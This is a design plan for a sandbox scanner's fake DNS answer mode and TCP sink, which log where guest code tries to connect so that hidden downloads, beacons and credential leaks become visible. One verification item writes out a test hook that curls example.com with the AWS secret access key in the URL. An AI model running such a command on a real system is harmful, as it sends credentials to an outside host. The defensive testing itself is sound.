# Other fake services: a network sink (3c)

## Status: gated

The milestone says this stays out until a scan shows it's needed. The
gate, so it can be recognised when it opens:

- a calibration or real scan where the verdict or a reader's decision
  depends on the destination of a connection that the report can only show
  as an IP address (hostname missing because the code connected by IP or
  used a resolver the DNS logger doesn't see), or
- a skill that stops at the first failed connection and hides later
  behaviour that a working-looking network would reveal (stage-two
  download, beacon, update check), seen in more than one scan.

Until then, `connect` HIGH on any non-local address and `dns-lookup` MEDIUM
with the name already carry verdicts. This file is the plan for when the
gate opens, so the design isn't decided in a hurry.

## What exists

- `scripts/sbox-dns.py`: answers every query NXDOMAIN, logs type and name,
  started by `sbox-run` in the run's namespace on 172.16.0.1:53 as
  `sbox-vm`; its log is printed with the nonce after the run.
- `scan.go: parseTrace` turns `connect` into `net` events; `analyze.isLocal`
  excludes the VM side of the tap (172.16.0.1) and loopback.
- The namespace has no route out: topology, not rules, is the boundary.
  Anything the sink does must keep that true.

## Design

**Answer mode for DNS.** `sbox-dns.py --answer 172.16.0.1`: A and AAAA
queries get the VM side of the tap (AAAA gets NOERROR with no records, so
clients fall back to A); everything else stays NXDOMAIN; the log is
unchanged. The guest then connects to 172.16.0.1 on whatever port the code
wanted, and the name it resolved is now attached to the connection through
the sink.

**The sink.** `scripts/sbox-sink.py <address> <log>` (Python 3 standard
library, like the others): listens on 172.16.0.1 for every TCP port through
one nftables rule in the namespace, `tcp dport != {53, 3128} redirect to
:4444` (`nftables` is added to the Lima VM's packages in `provision.sh`;
the rule lives in the run's namespace and dies with it), and reads the
original destination with `SO_ORIGINAL_DST`. For each
connection it reads up to 4 KiB or 2 s, then closes, and logs one line:

```
SINK <ip>:<port> [sni=<name>] [http=<METHOD> <Host> <path>] [bytes=<n>]
```

- A TLS ClientHello is parsed for its SNI (first record only, bounded;
  malformed input logs `bytes=` only). The connection is closed before any
  handshake: no certificate, no interception, nothing decrypted.
- Plain HTTP logs the request line and `Host` header, truncated to 200
  printable characters, escaped like the DNS logger escapes labels.
- Anything else logs the byte count. At most 10,000 lines.

UDP other than DNS is dropped by the kernel as before. The guest still
can't reach anything outside the namespace: the sink is a listener on the
tap's own address.

**Attribution.** `sbox-run` prints the sink log as `SBOX-$nonce SINK ...`
after the run; `collectRuns` attributes lines to entry points by the same
DNS sentinel boundary (each entry point's sentinel lookup precedes its
traffic; the sink log is interleaved with the DNS log by time, so the two
logs are merged on write with a sequence number, or the sink logs the
sentinel lookups' answers itself; decide when building, the sequence number
is simpler).

**Report and findings.** In answer mode, strace's `connect` to
172.16.0.1:<port> lines are replaced by the sink's lines, the way DNS lines
are replaced by names today: `connect example.com:443 (TLS, SNI
example.com)` or `connect 93.184.216.34:80 (GET / Host: example.com)`.
Rules: `connect` HIGH unchanged, now with a name; the canary rules also
look at SNI, Host and path, so a credential in a URL is
`canary-exfiltration` CRITICAL (today it would only show as a DNS lookup if
the name carried it).

**Flag first, default later.** `sbox scan -fake-net` turns answer mode and
the sink on. The default stays off until the calibration set shows no
verdict changes except ones with better information. Then the flag flips
and the old mode goes away; no permanent option.

## Commits

- [ ] **1.** `sbox-dns.py --answer`, with its self-test extended (A answered, AAAA
    empty, MX still NXDOMAIN, log unchanged).
- [ ] **2.** `sbox-sink.py` with a self-test for the ClientHello and HTTP parsers on
    byte literals; `sbox-run.sh` starts it when the drive carries
    `sbox/fake-net`, adds and removes the nft rule with the namespace.
- [ ] **3.** Host side: `SINK` markers, attribution, report lines, rules, `-fake-net`
    flag, JSON `network` entries gain `sni`/`http` fields.
- [ ] **4.** Calibration, decision on the default, `MILESTONE.md` 3c ✅.

## Verification

- [ ] A probe hook that runs `curl https://example.com/?k=$AWS_SECRET_ACCESS_KEY`:
  today, a DNS lookup of example.com; with `-fake-net`, a `connect` with
  SNI and, since curl's TLS fails before sending the URL, no path (the
  canary goes nowhere; the report says so). The same with `http://` shows
  the path and the canary: CRITICAL.
- [ ] A probe that connects to a raw IP on port 8443 and sends a TLS hello:
  SNI shown.
- [ ] Doctor's run probe still finds the internet blocked, with the sink
  running (a curl to a real IP reaches the sink, not the internet; the
  probe checks for the sink's close, not a timeout).
- [ ] Nothing left in the namespace or nft after a run (the cleanup deletes the
  namespace, which drops its rules).

## Out of scope

- Answering HTTP with content, serving certificates, or any interception.
- UDP sinks, ICMP.
- Per-skill allowlists for "expected" destinations: a finding with a name
  is enough to judge by hand.
